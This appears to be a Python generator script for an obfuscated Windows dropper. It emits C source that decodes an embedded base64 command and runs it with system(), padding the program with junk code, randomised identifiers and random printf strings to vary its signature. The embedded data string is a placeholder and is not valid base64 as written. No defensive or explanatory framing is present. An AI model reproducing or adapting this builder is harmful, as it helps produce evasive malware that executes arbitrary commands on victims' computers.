import string
from random import *
from lib import junk

characters = string.ascii_letters + string.digits
words = string.ascii_letters
string_rem = str("".join(choice(words) for x in range(randint(7, 13))))
payload_generate = junk.junk_code + '''
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

typedef unsigned char ubyte;
const ubyte BASE64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
int findIndex(const ubyte val) {
    if ('A' <= val && val <= 'Z') {
        return val - 'A';
    }
    if ('a' <= val && val <= 'z') {
        return val - 'a' + 26;
    }
    if ('0' <= val && val <= '9') {
        return val - '0' + 52;
    }
    if (val == '+') {
        return 62;
    }
    if (val == '/') {
        return 63;
    }
    return -1;
}
 
int decode(const ubyte source[], ubyte sink[]) {
    const size_t length = strlen(source);
    const ubyte *it = source;
    const ubyte *end = source + length;
    int acc;
 
    if (length % 4 != 0) {
        return 1;
    }
 
    while (it != end) {
        const ubyte b1 = *it++;
        const ubyte b2 = *it++;
        const ubyte b3 = *it++;         // might be the first padding byte
        const ubyte b4 = *it++;         // might be the first or second padding byte
 
        const int i1 = findIndex(b1);
        const int i2 = findIndex(b2);
 
        acc = i1 << 2;                  // six bits came from the first byte
        acc |= i2 >> 4;                 // two bits came from the first byte
        *sink++ = acc;                  // output the first byte
 
        if (b3 != '=') {
            const int i3 = findIndex(b3);
 
            acc = (i2 & 0xF) << 4;      // four bits came from the second byte
            acc += i3 >> 2;             // four bits came from the second byte
            *sink++ = acc;              // output the second byte
 
            if (b4 != '=') {
                const int i4 = findIndex(b4);
 
                acc = (i3 & 0x3) << 6;  // two bits came from the third byte
                acc |= i4;              // six bits came from the third byte
                *sink++ = acc;          // output the third byte
            }
        }
    }
 
    *sink = '\0';   // add the sigil for end of string
    return 0;
}

void ''' + str("".join(choice(words) for x in range(randint(5, 7)))) + '''() {

    int ''' + string_rem + ''';
    printf("Enter something: ");
    scanf("%d", &''' + string_rem + ''');

    if(''' + string_rem + ''' % 2 == 0)
        printf("%d is even.", ''' + string_rem + ''');
    else
        printf("%d is odd.", ''' + string_rem + ''');

}



int main(int argc, char *argv[])
{

printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");

char cmd[50000];
   ubyte data[] = "cakeisgoodiguess999";
   ubyte decoded[1024];
   decode(data, cmd);

system(cmd);

printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");



return 0;
}'''
